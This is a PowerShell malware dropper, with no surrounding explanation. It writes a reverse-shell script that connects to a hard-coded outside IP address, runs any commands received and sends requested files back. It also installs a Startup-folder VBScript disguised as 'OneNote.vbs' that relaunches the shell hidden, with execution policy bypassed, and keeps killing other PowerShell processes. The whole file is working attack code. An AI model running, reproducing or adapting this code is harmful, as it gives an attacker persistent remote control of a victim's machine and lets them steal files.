$code = @'
while ($true) {
    try {
        $xDVlCvoMdHgpL = New-Object System.Net.Sockets.TCPClient('34.140.143.225', 78)
        if ($xDVlCvoMdHgpL.Connected) {
            $VrH5Qud0LjAtoh67B = $xDVlCvoMdHgpL.GetStream()
            $wfAa7Iy8HZOUl = [DateTime]::Now

            while ($xDVlCvoMdHgpL.Connected) {
                [byte[]]$6JqXwPG5R4fcvnCgWS = 0..65535 | ForEach-Object { 0 }  
                $EdzR = $VrH5Qud0LjAtoh67B.Read($6JqXwPG5R4fcvnCgWS, 0, $6JqXwPG5R4fcvnCgWS.Length)   

                if ($EdzR -gt 0) {
                    $wfAa7Iy8HZOUl = [DateTime]::Now  
                    $DvVYDoMWkxivVmY = [System.Text.Encoding]::ASCII.GetString($6JqXwPG5R4fcvnCgWS, 0, $EdzR)  

                    
                    if ($DvVYDoMWkxivVmY -match "^download\s+(.+)") {
                        $5gYpZHIWOjD4k = $xI5kr[1]
                        if (Test-Path $5gYpZHIWOjD4k -PathType Leaf) {
                            $SxnAbv51nGA4w = [System.IO.File]::ReadAllBytes($5gYpZHIWOjD4k)
                            $VrH5Qud0LjAtoh67B.Write($SxnAbv51nGA4w, 0, $SxnAbv51nGA4w.Length)
                            $VrH5Qud0LjAtoh67B.Flush()
                        } else {
                            $VrH5Qud0LjAtoh67B.Write([System.Text.Encoding]::ASCII.GetBytes("File not found."), 0, 14)
                            $VrH5Qud0LjAtoh67B.Flush()
                        }
                    } else {
                        $XCkVf7Nw8ybBcj2D3nvA1HI = Invoke-Expression ". { $DvVYDoMWkxivVmY } 2>&1" | Out-String    
                        $AuOT = $XCkVf7Nw8ybBcj2D3nvA1HI + 'PS ' + (Get-Location).Path + '> '      
                        $uDZ45ItzUDV = [System.Text.Encoding]::ASCII.GetBytes($AuOT)   
                        $VrH5Qud0LjAtoh67B.Write($uDZ45ItzUDV, 0, $uDZ45ItzUDV.Length)                    
                        $VrH5Qud0LjAtoh67B.Flush()                                                  
                    }
                }

                $Bk8e5o = [DateTime]::Now - $wfAa7Iy8HZOUl
                if ($Bk8e5o.TotalMinutes -ge 2) {
                    $xDVlCvoMdHgpL.Close()
                    break  
                }
            }

            $xDVlCvoMdHgpL.Close()  
        }
    } catch {
        Start-Sleep -Seconds 10  
    }
}

# This is a commentdas in PowerShell

'@


$programsFolder = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::Programs)


$scriptPath = Join-Path $programsFolder "script.ps1"
$code | Out-File -FilePath $scriptPath -Encoding ascii


$startupFolder = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::Startup)


$batchScriptPath = Join-Path $startupFolder "OneNote.vbs"
$batchCode = @"
Function IsProcessRunning(processName)
    Dim objWMIService, colProcesses, objProcess
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set colProcesses = objWMIService.ExecQuery("Select * from Win32_Process Where Name = '" & processName & "'")
    IsProcessRunning = False
    For Each objProcess in colProcesses
        IsProcessRunning = True
    Next
End Function

' Function to terminate a process
Sub TerminateProcess(processName)
    Dim objWMIService, colProcesses, objProcess
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set colProcesses = objWMIService.ExecQuery("Select * from Win32_Process Where Name = '" & processName & "'")
    For Each objProcess in colProcesses
        objProcess.Terminate()
    Next
End Sub

' Create a Shell object
Set objShell = CreateObject("WScript.Shell")

' Path to the PowerShell script comons
scriptPath = "$scriptPath"

Do
    ' Check if PowerShell process is running and terminate it if necessary
    If IsProcessRunning("powershell.exe") Then
        TerminateProcess("powershell.exe")
    End If

    ' Command to run PowerShell script in hidden mode
    command = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & scriptPath & """"

    ' Execute the command and capture return value
    returnValue = objShell.Run(command, 0, True)

    ' Wait for a moment before checking if the process is still running
    WScript.Sleep 5000

Loop
"@
$batchCode | Out-File -FilePath $batchScriptPath -Encoding ascii

# Specify the path to the VBScript file

# Start the VBScript using cscript.exe
Start-Process $batchScriptPath

